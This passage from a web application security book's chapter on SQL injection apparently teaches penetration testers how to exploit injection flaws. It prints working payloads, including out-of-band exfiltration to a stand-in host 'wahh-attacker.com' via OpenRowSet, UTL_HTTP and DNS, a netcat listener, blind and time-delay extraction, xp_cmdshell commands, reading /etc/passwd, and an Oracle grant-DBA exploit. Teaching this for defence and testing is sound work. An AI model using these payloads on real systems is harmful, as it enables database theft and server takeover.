these differences covering many different databases can be\nfound here:\nhttp://sqlzoo.net/howto/source/z.dir/i08fun.xml\nIn a variation on this situation, the authors have encountered cases in which\nwhat is returned by the application is not an actual number, but some resource\nfor which that number is an identifier. The application performs a SQL query\nbased on user input, obtains a numeric identifier for a document, and then\nreturns the document’s contents to the user. In this situation, an attacker can\nfirst obtain a copy of every document whose identifiers are within the relevant\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 274\n274 Chapter 9 ■ Injecting Code\nnumeric range and construct a mapping of document contents to identifiers.\nThen, when performing the attack described previously, the attacker can con-\nsult this map to determine the identifier for each document received from the\napplication, and thereby retrieve the ASCII value of the character that they\nhave successfully extracted.\nUsing an Out-of-Band Channel\nIn many cases of SQL injection, the application does not return the results of\nany injected query to the user’s browser, nor does it return any error messages\ngenerated by the database. In this situation, it may appear that your position is\nfutile: even if a SQL injection flaw exists, it surely cannot be exploited to extract\narbitrary data or perform any other action. This appearance is false, however,\nand there are various techniques that you can use to retrieve data, and verify\nthat other malicious actions have been successful.\nThere are many circumstances in which you may be able to inject an arbi-\ntrary query but not retrieve its results. Recall the example of the vulnerable\nlogin form, where the username and password fields are vulnerable to SQL\ninjection:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nIn addition to modifying the logic of the query to bypass the login, you can\ninject an entirely separate subquery using string concatenation to join its\nresults to the item you control. For example:\nfoo’ || (SELECT 1 FROM dual WHERE (SELECT username FROM all_users WHERE\nusername = ‘DBSNMP’) = ‘DBSNMP’)--\nThis will cause the application to perform the following query:\nSELECT * FROM users WHERE username = ‘foo’ || (SELECT 1 FROM dual WHERE\n(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’)\nThe database will execute your arbitrary subquery, append its results to foo\nand then look up the details of the resulting username. Of course, the login\nwill fail, but your injected query will have been executed. All you will receive\nback in the application’s response is the standard login failure message. What\nyou then need is a means of retrieving the results of your injected query.\nA different situation arises when you are able to employ batch queries\nagainst MS-SQL databases. Batch queries are extremely useful, because they\nallow you to execute an entirely separate statement over which you have full\ncontrol, using a different SQL verb and targeting a different table. However,\nbecause of the way batch queries are carried out, the results of an injected\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 275\nChapter 9 ■ Injecting Code 275\nquery cannot be directly retrieved. Again, you need a means of retrieving the\nlost results of your injected query.\nOne method for retrieving data that is often effective in this situation is to\nuse an out-of-band channel. Having achieved the ability to execute arbitrary\nSQL statements within the database, it is often possible to leverage some of the\ndatabase’s built-in functionality to create a network connection back to your\nown computer, over which you can transmit arbitrary data that you have gath-\nered from the database.\nThe means of creating a suitable network connection are highly database-\ndependent, and different methods may or may not be available given the priv-\nilege level of the database user with which the application is accessing the\ndatabase. Some of the most common and effective techniques for each type of\ndatabase are described here.\nMS-SQL\nThe OpenRowSet command can be used to open a connection to an external\ndatabase and insert arbitrary data into it. For example, the following query\nwill cause the target database to open a connection to the attacker’s database\nand insert the version string of the target database into the table called foo:\ninsert into openrowset(‘SQLOLEDB’,\n‘DRIVER={SQL Server};SERVER=wahh-attacker.com,80;UID=sa;PWD=letmein’,\n‘select * from foo’) values (@@version)\nNote that you can specify port 80, or any other likely value, to increase your\nchance of making an outbound connection through any firewalls.\nOracle\nOracle contains a large amount of default functionality that is accessible by\nlow-privileged users and can be used to create an out-of-band connection.\nThe UTL_HTTPpackage can be used to make arbitrary HTTP requests to other\nhosts. UTL_HTTPcontains rich functionality and supports proxy servers, cook-\nies, redirects, and authentication. This means that an attacker who has com-\npromised a database on a highly restricted internal corporate network may be\nable to leverage a corporate proxy to initiate outbound connections to the\nInternet.\nIn the following example, UTL_HTTP is used to transmit the results of an\ninjected query to a server controlled by the attacker:\nhttps://wahh-app.com/employees.asp?EmpNo=7521’||UTL_HTTP.request\n(‘wahh-attacker.com:80/‘||(SELECT%20username%20FROM%20all_\nusers%20WHERE%20ROWNUM%3d1))--\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 276\n276 Chapter 9 ■ Injecting Code\nThis URL causes UTL_HTTP to make a GET request for a URL containing the\nfirst username in the table all_users. The attacker can simply set up a netcat\nlistener on wahh-attacker.comto receive the result:\nC:\\>nc -nLp 80\nGET /SYS HTTP/1.1\nHost: wahh-attacker.com\nConnection: close\nThe UTL_INADDRpackage is designed to be used to resolve host names to IP\naddresses. It can be used to generate arbitrary DNS queries to a server con-\ntrolled by the attacker. In many situations, this is more likely to succeed than\nthe UTL_HTTP attack because DNS traffic is often allowed out through corpo-\nrate firewalls even when HTTP traffic is restricted. The attacker can leverage\nthis package to perform a lookup on a hostname of their choice, effectively\nretrieving arbitrary data by prepending it as a subdomain to a domain name\nthat they control, for example:\nhttps://wahh-app.com/employees.asp?EmpNo=7521’||UTL_INADDR.GET_HOST_\nNAME((SELECT%20PASSWORD%20FROM%20DBA_USERS%20WHERE%20USERNAME=’SYS’)||’.\nwahh-attacker.com’)\nThis results in a DNS query to the wahh-attacker.comname server contain-\ning the SYSuser’s password hash:\nDCB748A5BC5390F2.wahh-attacker.com\nThe UTL_SMTPpackage can be used to send emails. This facility can be used\nto retrieve large volumes of data captured from the database by sending this in\noutbound emails.\nThe UTL_TCPpackage can be used to open arbitrary TCP sockets to send and\nreceive network data.\nMySQL\nThe SELECT ... INTO OUTFILEcommand can be used to direct the output from\nan arbitrary query into a file. The specified filename may contain a UNC path,\nenabling you to direct the output to a file on your own computer. For example:\nselect * into outfile ‘\\\\\\\\attacker\\\\share\\\\output.txt’ from users;\nTo receive the file, you will need to create an SMB share on your computer\nthat allows anonymous write access. You can configure shares on both Win-\ndows and Unix-based platforms to behave in this way. If you have difficulty\nreceiving the exported file, this may well result from a configuration issue in\nyour SMB server. You can use a sniffer to confirm whether the target server is\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 277\nChapter 9 ■ Injecting Code 277\ninitiating any inbound connections to your computer, and if so, consult your\nserver documentation to ensure it is correctly configured.\nLeveraging the Operating System\nIt is often possible to perform escalation attacks via the database that result in\nexecution of arbitrary commands on the operating system of the database\nserver itself. In this situation, there are many more avenues available to you for\nretrieval of data, such as using built-in commands like tftp, mail, and telnet,\nor copying data into the web root for retrieval using a browser. See the later\nsection “Beyond SQL Injection” for techniques for escalating privileges on the\ndatabase itself.\nUsing Inference: Conditional Responses\nThere are many reasons why an out-of-band channel may not be available—\nmost commonly, because the database is located within a protected network\nwhose perimeter firewalls do not allow any outbound connections to the Inter-\nnet or any other network. In this situation, you are restricted to accessing the\ndatabase entirely via your injection point into the web application.\nIn this situation, working more or less blind, there are still techniques you\ncan use to retrieve arbitrary data from within the database. These techniques\nare all based upon the concept of using an injected query to conditionally trig-\nger some detectable behavior by the database and then inferring a required\nitem of information on the basis of whether this behavior occurs.\nThis topic is a thriving area of current research into web application attack\ntechniques, and we will examine the very latest methods that have been\ndevised at the time of this writing.\nRecall the vulnerable login function where the username and password\nfields can be injected into to perform arbitrary queries:\nSELECT * FROM users WHERE username = ‘marcus’ and password = ‘secret’\nSuppose that you have not identified any method of transmitting the results\nof your injected queries back to the browser. Nevertheless, you have already\nseen how you can use SQL injection to modify the application’s behavior. For\nexample, submitting the following two pieces of input will cause very differ-\nent results:\nadmin’ AND 1=1--\nadmin’ AND 1=2--\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 278\n278 Chapter 9 ■ Injecting Code\nIn the first case, the application will log you in as the admin user. In the sec-\nond case, the login attempt will fail, because the 1=2condition is always false.\nYou can leverage this control of the application’s behavior as a means of infer-\nring the truth or falsehood of arbitrary conditions within the database itself.\nFor example, using the ASCII and SUBSTRING functions described previously,\nyou can test whether a specific character of a captured string has a specific\nvalue. For example, submitting this piece of input will log you in as the admin\nuser, because the condition tested is true:\nadmin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 65--\nSubmitting the following input, however, will result in a failed login,\nbecause the condition tested is false:\nadmin’ AND ASCII(SUBSTRING(‘Admin’,1,1)) = 66--\nBy submitting a large number of such queries, cycling through the range of\nlikely ASCII codes for each character until a hit occurs, you can extract the\nentire string, one byte at a time.\nAbsinthe\nPerforming this inference-based attack manually would be extremely tedious\nand time-consuming, requiring numerous requests for every single byte of\nretrieved data. Fortunately, there are various ways in which you can automate\nand parallelize the attack, to extract a large amount of information in a rela-\ntively short period of time. An excellent tool that you can use to perform this\ntask is Absinthe.\nAbsinthe is not a point-and-click tool. To use it effectively, you need to fully\nunderstand the SQL injection flaw you are exploiting, and have reached the\npoint where you can supply crafted input that affects the application’s\nresponse in some detectable way.\nThe first step is to configure Absinthe with all the information required to\nperform the attack. This includes:\n■■ The URL and request method.\n■■ The type of database being targeted, so that Absinthe can retrieve the\nrelevant meta-information once the attack is underway.\n■■ The parameters to the request, and whether each is injectable.\n■■ Any further options to fine-tune the attack. If necessary, Absinthe can\nappend a specified string at the end of each injected payload and can\nadd the comment character, to ensure that the resulting modified query\nis syntactically valid.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 279\nChapter 9 ■ Injecting Code 279\nA typical configuration is shown in Figure9-1.\nFigure9-1: A typical Absinthe configuration\nThe next step is to click the Initialize Injection option. This causes Absinthe\nto issue two test requests, designed to trigger different application responses.\nAs described in the previous attack, Absinthe injects the following two\npayloads:\n‘ AND 1=1--\n‘ AND 1=2--\nProvided that you have configured Absinthe correctly, the two test requests\nshould result in different responses from the application, confirming that you\nare ready to exploit the vulnerability.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 280\n280 Chapter 9 ■ Injecting Code\nTIP Depending on the syntactic complexity of the query into which you are\ninjecting, your first connection test may or may not be successful in generating\ndifferent responses from the application. If it is not, then you need to fix up\nthe syntax of the query that Absinthe’s requests are generating, given your\nunderstanding gained from your manual probing of the application. To modify\nthe syntax following Absinthe’s payload, you can change the Append Text to\nEnd of Query option. To modify the syntax before the payload, you can change\nthe default value for the relevant parameter. Keep experimenting until the\nInitialize Injectiontest is successful.\nWhen you are satisfied that Absinthe has been correctly configured to\nexploit the vulnerability, you can launch the attack. To do this, go to the DB\nSchema tab and select one or more of the available actions: Retrieve Username,\nLoad Table Info, and Load Field Info.\nAbsinthe works by replacing the test 1=1condition with a huge number of\nother conditions designed to discover the contents of the database and retrieve\narbitrary data from it.\nFor example, if you are targeting the Oracle platform, Absinthe may dis-\ncover the first character of the current database user’s username by injecting\nvalues like the following:\nadmin’ AND (SELECT ASCII(SUBSTR(a.username,1,1)) FROM USER_USERS a WHERE\nA.USERNAME = user) = 65\nThis condition will be true if the first character of the username is A.\nAbsinthe will detect that it is true because the application’s response is identi-\ncal to the original 1=1 response. By automating a large number of queries,\nAbsinthe will retrieve the entire string.\nIn fact, rather than iterating through every possible character to find a hit,\nAbsinthe uses a more sophisticated binary choptechnique, which dramatically\nreduces the number of requests needed. This involves first testing whether the\nqueried character is higher than X, which is the middle value in the range of\nallowed values. If so, the test is repeated for 1.5X; if not, it is repeated for 0.5X.\nFor example:\nadmin’ AND (SELECT ASCII(SUBSTR(a.username,1,1)) FROM USER_USERS a WHERE\nA.USERNAME = user) > 19443--\nadmin’ AND (SELECT ASCII(SUBSTR(a.username,1,1)) FROM USER_USERS a WHERE\nA.USERNAME = user) > 9722--\netc...\nIn general, this method enables the value of the targeted character to be dis-\ncovered in the smallest possible number of attempts.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 281\nChapter 9 ■ Injecting Code 281\nAbsinthe understands how to probe the metadata of each type of database,\nas described earlier. This enables it to use the preceding simple steps to\nretrieve any desired data from within the database, including the table and\ncolumn structure, and the actual data held within any given table. It presents\nall of this information in a hierarchical tree format, as shown in Figure9-2.\nFigure9-2: Absinthe results showing the table structure within\nthe database\nWhen Absinthe has gathered all of the data that you require, you can even\nexport the captured information in XML format, by going to the Download\nRecords tab. For example:\n<AbsinthedatabasePull version=”1.0”>\n<datatable name=”USERS”>\n<DataRecord PrimaryKey=”LOGIN” PrimaryKeyValue=”admin”>\n<PASSWORD>0wned</PASSWORD>\n<LOGIN>admin</LOGIN>\n</DataRecord>\n<DataRecord PrimaryKey=”LOGIN” PrimaryKeyValue=”manicsprout”>\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 282\n282 Chapter 9 ■ Injecting Code\n<PASSWORD>gameover</PASSWORD>\n<LOGIN>maniscprout</LOGIN>\n</DataRecord>\n</datatable>\n</AbsinthedatabasePull>\nInducing Conditional Errors\nIn the preceding example, the application contained some prominent func-\ntionality whose logic could be directly controlled by injecting into an existing\nSQL query. The designed behavior of the application (a successful versus a\nfailed login) could be hijacked to return a single item of information to the\nattacker. However, not all situations are this straightforward. In some cases,\nyou may be injecting into a query that has no noticeable effect on the applica-\ntion’s behavior, such as a logging mechanism. In other cases, you may be\ninjecting a subquery or a batched query whose results are not processed by the\napplication in any way. In this situation, you may struggle to find a way of\ncausing a detectable difference in behavior that is contingent on a specified\ncondition.\nDavid Litchfield devised a technique that can be used to trigger a detectable\ndifference in behavior in most circumstances. The core idea is to inject a query\nthat induces a database error contingent upon some specified condition. When\na database error occurs, this will often be externally detectable, either through\nan HTTP 500 response code, or through some kind of error message or anom-\nalous behavior (even if the error message itself does not disclose any useful\ninformation).\nThe technique relies upon a feature of database behavior when evaluating\nconditional statements: the database only evaluates those parts of the state-\nment that need to be evaluated given the status of other parts. An example of\nthis behavior is a SELECTstatement containing a WHEREclause:\nSELECT X FROM Y WHERE C\nThis causes the database to work through each row of table Y, evaluating\ncondition C, and returning Xin those cases where condition Cis true. If condi-\ntion Cis never true, then the expression Xis never evaluated.\nThis behavior can be exploited by finding an expression X that is syntacti-\ncally valid but that generates an error if it is ever evaluated. An example of\nsuch an expression in Oracle and MS-SQL is a divide-by-zero computation,\nsuch as 1/0. If condition C is ever true, then expression X will be evaluated,\ncausing a database error. If condition C is always false, then no error will be\ngenerated. You can, therefore, use the presence or absence of an error to test an\narbitrary condition C.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 283\nChapter 9 ■ Injecting Code 283\nAn example of this is the following query, which tests whether the default\nOracle user DBSNMPexists. If this user exists, then the expression 1/0is evalu-\nated, causing an error:\nSELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE\nusername = ‘DBSNMP’) = ‘DBSNMP’\nThe following query tests whether an invented user AAAAAAexists. Because\nthe WHERE condition is never true, the expression 1/0 is not evaluated, and so\nno error occurs.\nSELECT 1/0 FROM dual WHERE (SELECT username FROM all_users WHERE\nusername = ‘AAAAAA’) = ‘AAAAAA’\nWhat this technique achieves is a way of inducing a conditional response\nwithin the application, even in cases where the query you are injecting has no\nimpact on the application’s logic or data processing. It, therefore, enables you\nto use the inference techniques described previously to extract data in a very\nwide range of situations. Further, because of the technique’s simplicity, the\nsame attack strings will work on a range of databases, and where the injection\npoint is into various types of SQL statement.\nUsing Time Delays\nDespite all of the sophisticated techniques already described, there may yet be\nsituations in which none of these tricks are effective. In some cases, you may\nbe able to inject a query that returns no results to the browser, cannot be used\nto open an out-of-band channel, and that has no effect on the application’s\nbehavior, even if it induces an error within the database itself.\nIn this situation, all is not lost, thanks to a technique invented by Chris\nAnley and Sherief Hammad of NGSSoftware. They devised a way of crafting\na query that would cause a time delay, contingent upon some condition speci-\nfied by the attacker. The attacker can submit his query, and then monitor the\ntime taken for the server to respond. If a delay occurs, then the attacker may\ninfer that the condition is true. Even if the actual content of the application’s\nresponse is identical in the two cases, the presence or absence of a time delay\nenables the attacker to extract a single bit of information from the database. By\nperforming numerous such queries, the attacker can systematically retrieve\narbitrarily complex data from the database, one bit at a time.\nThe precise means of inducing a suitable time delay depends upon the tar-\nget database being used. MS-SQL contains a built-in WAITFORcommand, which\ncan be used to cause a specified time delay. For example, the following query\nwill cause a time delay of 5 seconds if the current database user is sa:\nif (select user) = ‘sa’ waitfor delay ‘0:0:5’\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 284\n284 Chapter 9 ■ Injecting Code\nEquipped with this command, the attacker can retrieve arbitrary informa-\ntion in various ways. One method is to leverage the same technique already\ndescribed for the case where the application returns conditional responses.\nNow, instead of triggering a different application response when a particular\ncondition is detected, the injected query instead induces a time delay. For\nexample, the second of these queries will cause a time delay, indicating that the\nfirst letter of the captured string is A:\nif ASCII(SUBSTRING(‘Admin’,1,1)) = 64 waitfor delay ‘0:0:5’\nif ASCII(SUBSTRING(‘Admin’,1,1)) = 65 waitfor delay ‘0:0:5’\nAs before, the attacker can cycle through all possible values for each charac-\nter until a time delay occurs. Alternatively, the attack could be made more effi-\ncient by reducing the number of requests needed. An additional technique to\nthat described previously for Absinthe is to break each byte of data down into\nindividual bits and retrieve each bit in a single query. The POWERcommand and\nthe bitwise AND operator & can be used to specify conditions on a bit-by-bit\nbasis. For example, the following query will test the first bit of the first byte of\nthe captured data, and pause if it is 1:\nif (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,0))) > 0 waitfor delay\n‘0:0:5’\nThe following query will perform the same test on the second bit:\nif (ASCII(SUBSTRING(‘Admin’,1,1)) & (POWER(2,1))) > 0 waitfor delay\n‘0:0:5’\nAs mentioned earlier, the means of inducing a time delay are highly database-\ndependent. Other databases do not contain a built-in time-delay command;\nhowever, you can easily use other tricks to cause a time delay to occur.\nIn MySQL, the benchmark function can be used to perform a specified\naction repeatedly. Instructing the database to perform a processor-intensive\naction, such as a SHA-1 hash, a large number of times will result in a measur-\nable time delay. For example:\nselect if(user() like ‘root@%‘, benchmark(50000,sha1(‘test’)), ‘false’)\nIn Oracle, one trick is to use UTL_HTTP to connect to a nonexistent server,\ncausing a timeout. This will cause the database to attempt to connect to the\nspecified server, and eventually timeout. For example:\nSELECT ‘a’||Utl_Http.request(‘http://madeupserver.com’) from dual\n...delay...\nORA-29273: HTTP request failed\nORA-06512: at “SYS.UTL_HTTP”, line 1556\nORA-12545: Connect failed because target host or object does not exist\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 285\nChapter 9 ■ Injecting Code 285\nYou can leverage this behavior to cause a time delay contingent on some\ncondition that you specify. For example, the following query will cause a time-\nout if the default Oracle account DBSNMPexists:\nSELECT ‘a’||Utl_Http.request(‘http://madeupserver.com’) FROM dual WHERE\n(SELECT username FROM all_users WHERE username = ‘DBSNMP’) = ‘DBSNMP’\nIn both Oracle and MySQL databases, you can use the SUBSTR(ING)and\nASCII functions to retrieve arbitrary information one byte at a time, as\ndescribed previously.\nTIP We have described the use of time delays as a means of extracting\ninteresting information. However, the time-delay technique can also be\nimmensely useful when performing initial probing of an application to detect\nSQL injection vulnerabilities. In some cases of completely blind SQL injection,\nwhere no results are returned to the browser and all errors are handled\ninvisibly, the vulnerability itself may be very hard to detect using standard\ntechniques based on supplying crafted input. In this situation, using time delays\nis often the most reliable way of detecting the presence of a vulnerability\nduring initial probing. For example, if the back-end database is MS-SQL, then\nyou can inject each of the following strings into each request parameter in turn,\nand monitor the time taken for the application to respond to identify any\nvulnerabilities:\n‘; waitfor delay ‘0:30:0’--\n1; waitfor delay ‘0:30:0’--\nBeyond SQL Injection: Escalating the Database Attack\nA successful exploit of an SQL injection vulnerability very often results in total\ncompromise of all application data. Most applications employ a single account\nfor all database access and rely upon application-layer controls to enforce seg-\nregation of access between different users. Gaining unrestricted use of the\napplication’s database account results in access to all of its data.\nYou may suppose, therefore, that owning all of the application’s data is the\nfinishing point of a SQL injection attack. However, there are many reasons\nwhy it might be productive to advance your attack further, either by exploiting\na vulnerability within the database itself, or by harnessing some of its built-in\nfunctionality to achieve your objectives. Further attacks that can be performed\nby escalating the database attack include the following:\n■■ If the database is shared with other applications, you may be able to\nescalate privileges within the database and gain access to other applica-\ntions’ data.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 286\n286 Chapter 9 ■ Injecting Code\n■■ You may be able to compromise the operating system of the database\nserver.\n■■ You may be able to gain network access to other systems. Typically, the\ndatabase server is hosted on a protected network behind several layers\nof network perimeter defenses. From the database server, you may be\nin a trusted position and be able to reach key services on other hosts,\nwhich may be further exploitable.\n■■ You may be able to make network connections back out of the hosting\ninfrastructure to your own computer. This may enable you to bypass\nthe application altogether, easily transmitting large amounts of sensi-\ntive data gathered from the database, and often evading many intrusion\ndetection systems.\n■■ You may be able to extend the database’s existing functionality in arbi-\ntrary ways by creating user-defined functions. In some situations, this\nmay enable you to circumvent hardening that has been performed on\nthe database, by effectively re-implementing functionality that has been\nremoved or disabled. There is a method for doing this in each of the\nmainstream databases, provided that you have gained database admin-\nistrator (DBA) privileges.\nCOMMON MYTH Many database administrators assume that it is not\nnecessary to defend the database against attacks that require authentication to\nexploit. They may reason that the database is accessed by only a trusted\napplication that is owned by the same organization. This ignores the possibility\nthat a flaw within the application may enable a malicious third party to interact\nwith the database within the security context of the application. Each of the\npossible attacks just describedshould illustrate why databases need to be\ndefended against authenticated attackers.\nAttacking databases is a huge topic, which is beyond the scope of this book.\nIn this section, we will point you towards a few key ways in which vulnerabil-\nities and functionality within the main database types can be leveraged to\nescalate your attack. The key conclusion to draw is that every database con-\ntains ways of escalating privileges. Applying current security patches and\nrobust hardening can help to mitigate many of these attacks, but not all of\nthem. For further reading on this highly fruitful area of current research, we\nrecommend The Database Hacker’s Handbook (Wiley, 2005).\nMS-SQL\nPerhaps the most notorious piece of database functionality that an attacker can\nmisuse is the xp_cmdshell stored procedure, which is built into MS-SQL by\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 287\nChapter 9 ■ Injecting Code 287\ndefault. This stored procedure allows users with DBA permissions to execute\noperating system commands in the same way as the cmd.exe command\nprompt. For example:\nmaster..xp_cmdshell ‘ipconfig > foo.txt’\nThe scope for an attacker to misuse this functionality is huge. They can per-\nform arbitrary commands, pipe the results to local files, and read them back.\nThey can open out-of-band network connections back to themselves and\ncreate a backdoor command and communications channel, copying data from\nthe server and uploading attack tools. Because MS-SQL runs by default as\nLocalSystem, the attacker can typically fully compromise the underlying oper-\nating system, performing arbitrary actions. There is a wealth of other extended\nstored procedures within MS-SQL, such as xp_regread or xp_regwrite, that\ncan be used to perform powerful actions.\nNot every database account will have permissions to use these built-in stored\nprocedures, and in some cases the application uses a low-privileged account\nthat does not have the required permissions. However, it is extremely common\nfor applications to be using the all-powerful saaccount, because administrators\nassume that the application is trusted not to abuse the database.\nThe OpenRowSet command can be leveraged to perform a port scan of any\nlocal or remote network. If the specified IP address and port are open, the data-\nbase will attempt to connect, and eventually timeout; otherwise, it will fail\nimmediately. You can, therefore, use time delays to infer the status of ports that\nyou cannot reach directly:\nselect * from OPENROWSET(‘SQLOLEDB’, ‘uid=sa;pwd=foobar;Network=DBMSSOCN\n;Address=192.168.0.1,80;timeout=5’, ‘’)\nThis command can also be used to perform other attacks:\n■■ You can try to connect to other databases and guess usernames and pass-\nwords (for example, the common saaccount with a blank password).\n■■ You can connect back to the local host and attempt to guess the pass-\nword to the saaccount. In some situations, administrators assign a\nweak password to this account in the belief that the database server is\nfirewalled and so no attacker will be able to connect. You can circum-\nvent this restriction because you are connecting directly from the server\nitself.\n■■ Sometimes, if Windows-integrated authentication is in use, and multi-\nple databases are configured with the same credentials, you may be\nable to authenticate transparently from one database to another without\nsupplying any credentials.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 288\n288 Chapter 9 ■ Injecting Code\nOracle\nA huge number of security vulnerabilities have been found within the Oracle\ndatabase software itself. If you have found an SQL injection vulnerability that\nenables you to perform arbitrary queries, then you can typically escalate to\nDBA privileges by exploiting one of these vulnerabilities.\nOracle contains many built-in stored procedures that execute with DBA\nprivileges and have been found to contain SQL injection flaws within the pro-\ncedures themselves. One example of such a flaw existed in the default package\nSYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES prior to the July\n2006 critical patch update. This can be exploited to escalate privileges by\ninjecting the query grant DBA to publicinto the vulnerable field:\nselect SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES(‘INDX’,’SCH’,’T\nEXTINDEXMETHODS”.ODCIIndexUtilCleanup(:p1); execute immediate ‘’declare\npragma autonomous_transaction; begin execute immediate ‘’‘’grant dba to\npublic’‘’‘ ; end;’‘; END;--‘,’CTXSYS’,1,‘1’,0) from dual\nThis type of attack could be delivered via a SQL injection flaw in a web\napplication by injecting the function into the vulnerable parameter.\nMany other types of flaws have affected built-in components of Oracle. One\nexample is the CTXSYS.DRILOAD.VALIDATE_STMTfunction. The purpose of this\nfunction is to test that a specified string contains a valid SQL statement. How-\never, in earlier versions of Oracle, in the course of validating the supplied\nstatement the function actually executed it! This meant that any user could\nexecute any statement as DBA, simply by passing it to this function. For exam-\nple:\nexec CTXSYS.DRILOAD.VALIDATE_STMT(‘GRANT DBA TO PUBLIC’)\nIn addition to actual vulnerabilities like these, Oracle also contains a large\namount of default functionality that is accessible by low-privileged users and\ncan be used to perform undesirable actions, such as initiating network con-\nnections or accessing the file system. In addition to the powerful packages\nalready described for creating out-of-band connections, the package UTL_FILE\ncan be used to read from and write to files on the database server file system.\nSee The Oracle Hacker’s Handbook by David Litchfield (Wiley, 2007) for more\ndetail on escalating privileges within Oracle.\nMySQL\nCompared to the other databases covered, MySQL contains relatively little\nbuilt-in functionality that can be misused by an attacker. One example is the\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 289\nChapter 9 ■ Injecting Code 289\nability of any user with the FILE_PRIVpermission to read and write to the file\nsystem.\nThe LOAD_FILEcommand can be used to retrieve the contents of any file. For\nexample:\nselect load_file(‘/etc/passwd’)\nThe SELECT ... INTO OUTFILEcommand can be used to pipe the results of\nany query into a file. For example\ncreate table test (a varchar(200))\ninsert into test(a) values (‘+ +’)\nselect * from test into outfile ‘/etc/hosts.equiv’\nIn addition to reading and writing key operating system files, this capability\ncan also be used to perform other attacks:\n■■ Because MySQL stores its data in plaintext files, to which the database\nmust have read access, an attacker with FILE_PRIVpermissions can\nsimply open the relevant file and read arbitrary data from within the\ndatabase, bypassing any access controls enforced within the database\nitself.\n■■ MySQL enables users to create user-defined functions (UDFs), by\ncalling out to a compiled library file that contains the function’s\nimplementation. This file must be located within the normal path from\nwhich MySQL loads dynamic libraries. An attacker can use the preced-\ning method to create an arbitrary binary file within this path and then\ncreate a UDF that uses it. See Chris Anley’s paper “Hackproofing\nMySQL” for more details of this technique.\nSQL Syntax and Error Reference\nWe have described numerous techniques that enable you to probe for and\nexploit SQL injection vulnerabilities in web applications. In many cases, there\nare minor differences between the syntax that you need to employ against dif-\nferent back-end database platforms. Further, every database produces differ-\nent error messages whose meaning you need to understand both when\nprobing for flaws and when attempting to craft an effective exploit. The fol-\nlowing pages contain a brief cheat sheet that you can use to look up the exact\nsyntax you need for a particular task, and to decipher any unfamiliar error\nmessages which you encounter.\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 290\n290 Chapter 9 ■ Injecting Code\nSQL Syntax\nRequirement: ASCIIand SUBSTRING\nOracle: ASCII(‘A’)is equal to 65\nSUBSTR(‘ABCDE’,2,3)is equal to BCD\nMS-SQL: ASCII(‘A’)is equal to 65\nSUBSTRING(‘ABCDE’,2,3)is equal to BCD\nMySQL: ASCII(‘A’)is equal to 65\nSUBSTRING(‘ABCDE’,2,3)is equal to BCD\nRequirement: Retrieve current database user\nOracle: Select Sys.login_user from dual\nSELECT user FROM dual\nSYS_CONTEXT(‘USERENV’,’SESSION_USER’)\nMS-SQL: select user\nselect suser_sname()\nMySQL: SELECT user()\nRequirement: Cause a time delay\nOracle: Utl_Http.request(‘http://madeupserver.com’)\nMS-SQL: waitfor delay ‘0:0:10’\nexec master..xp_cmdshell ‘ping localhost’\nMySQL: benchmark(50000,sha1(‘test’))\nRequirement: Retrieve database version string\nOracle: select banner from v$version\nMS-SQL: select @@version\nMySQL: select @@version\nRequirement: Retrieve current database\nOracle: SYS_CONTEXT(‘USERENV’,’DB_NAME’)\nMS-SQL: select db_name()\nThe server name can be retrieved using:\nselect @@servername\nMySQL: Select database()\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 291\nChapter 9 ■ Injecting Code 291\nRequirement: Retrieve current user’s privilege\nOracle: select * from session_privs\nMS-SQL: select grantee, table_name, privilege_type\nfrom INFORMATION_SCHEMA.TABLE_PRIVILEGES\nMySQL: SHOW GRANTS FOR CURRENT_USER()\nRequirement: Show user objects\nOracle: Select object_name, object_type from\nuser_objects\nMS-SQL: SELECT * FROM sysobjects\nMySQL: (There is no database metadata in MySQL.)\nRequirement: Show user tables\nOracle: Select object_name, object_type from\nuser_objects WHERE object_type=’TABLE’\nOr to show all tables to which the user has access:\nSELECT table_name FROM all_tables\nMS-SQL: SELECT * FROM sysobjects WHERE xtype=’U’\nMySQL: (There is no database metadata in MySQL.)\nRequirement: Show column names for table foo\nOracle: Select column_name, Name from user_tab_columns\nwhere table_name = ‘FOO’\nUse the ALL_tab_columnstable if the target data is not\nowned by the current application user.\nMS-SQL: SELECT syscolumns.* FROM syscolumns JOIN\nsysobjects ON syscolumns.id=sysobjects.id\nWHERE sysobjects.name=’FOO’\nMySQL: show columns from foo\nRequirement: Interact with the operating system (simplest ways)\nOracle: See The Oracle Hacker’s Handbook, by David Litchfield\nMS-SQL: exec xp_cmshell ‘dir c:\\‘\nMySQL: select load_file(‘/etc/passwd’)\n70779c09.qxd:WileyRed 9/14/07 3:13 PM Page 292\n292 Chapter 9 ■ Injecting Code\nSQL Error Messages\nOracle: ORA-01756: quoted string not properly\nterminated\nORA-00933: SQL command not properly ended\nMS-SQL: Msg 170, Level 15, State 1, Line 1\nLine 1: Incorrect syntax near ‘foo\nMsg 105, Level 15, State 1, Line 1\nUnclosed quotation mark before the character\nstring ‘foo\nMySQL: You have an error in your SQL syntax. Check\nthe manual that corresponds to your MySQL\nserver version for the right syntax to use\nnear ‘’foo’ at line X\nTranslation: For Oracle and MS-SQL, SQL injection is present, and it is\nalmost certainly 